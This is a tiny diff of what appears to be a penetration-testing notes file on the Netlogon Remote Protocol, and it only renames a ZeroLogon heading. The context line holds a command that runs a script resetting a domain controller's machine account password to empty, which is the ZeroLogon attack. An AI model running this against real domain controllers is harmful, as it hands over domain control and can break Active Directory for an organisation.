@@ -1,6 +1,6 @@
 # Netlogon Remote Protocol
 
-#### Test for zeroLogon
+### zeroLogon
 
 ```
 python3 /opt/set_empty_pw.py dc-name $ip
